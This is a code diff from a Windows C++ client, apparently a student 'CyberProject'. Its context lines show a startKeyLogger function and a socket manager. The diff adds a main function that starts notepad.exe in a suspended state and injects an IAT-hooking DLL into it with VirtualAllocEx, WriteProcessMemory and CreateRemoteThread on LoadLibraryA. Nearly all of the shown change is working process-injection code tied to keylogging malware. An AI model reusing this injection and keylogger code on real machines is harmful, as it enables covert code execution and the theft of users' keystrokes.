@@ -8,6 +8,7 @@
 #include "string.h"
 #include "Aclapi.h""
 #include <thread>
+#include <tchar.h>
 
 using namespace std;
 
@@ -394,15 +395,7 @@ DWORD WINAPI startKeyLogger()
 		}
 	}
 }
-//int main()
-//{
-//	DWORD ThreadID;
-//	CreateThread(NULL, 0, startKeyLogger, (void*) this, 0, &ThreadID);
-//	cout << "hello";
-//	
-//
-//	return 0;
-//}
+
 int main2(int argc, char **argv)
 {
 	SocketManager socketManager;
@@ -556,3 +549,40 @@ int main2(int argc, char **argv)
 }
 
 
+int main()
+{
+	LPTSTR exePath = _tcsdup(TEXT("C:\\Users\\admin\\Desktop\\OS\\Hooking\\1\\notepad.exe"));
+	//LPSTR exePath = "C:\\Users\\admin\\Downloads\\NETSTAT.EXE";
+
+	char* dllPath = "C:\\Users\\admin\\Desktop\\CyberProject\\Client\\x64\\Debug\\IATHookingDLL.dll";
+
+	
+	STARTUPINFO info = { sizeof(info) };
+	PROCESS_INFORMATION processInfo;
+	HANDLE hprocess = NULL;
+	if (CreateProcess(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFO)&info, &processInfo))
+	{
+		hprocess = processInfo.hProcess;
+	}
+	if (!hprocess)
+	{
+		cout << GetLastError();
+	}
+	LPVOID LoadLibraryAtRemoteProcess =
+		(LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
+
+	LPVOID dllPathLocalAddress = (LPVOID)dllPath;
+	LPVOID dllPathRemoteAddress = (LPVOID)VirtualAllocEx(hprocess, NULL, strlen(dllPath),
+		MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	WriteProcessMemory(hprocess, dllPathRemoteAddress, dllPathLocalAddress,
+		strlen(dllPath), NULL);
+
+	CreateRemoteThread(hprocess, NULL, NULL, (LPTHREAD_START_ROUTINE)
+		LoadLibraryAtRemoteProcess, (LPVOID)dllPathRemoteAddress, NULL, NULL);
+
+	ResumeThread(processInfo.hThread);
+	WaitForSingleObject(processInfo.hProcess, INFINITE);
+	CloseHandle(processInfo.hProcess);
+	CloseHandle(processInfo.hThread);
+
+}
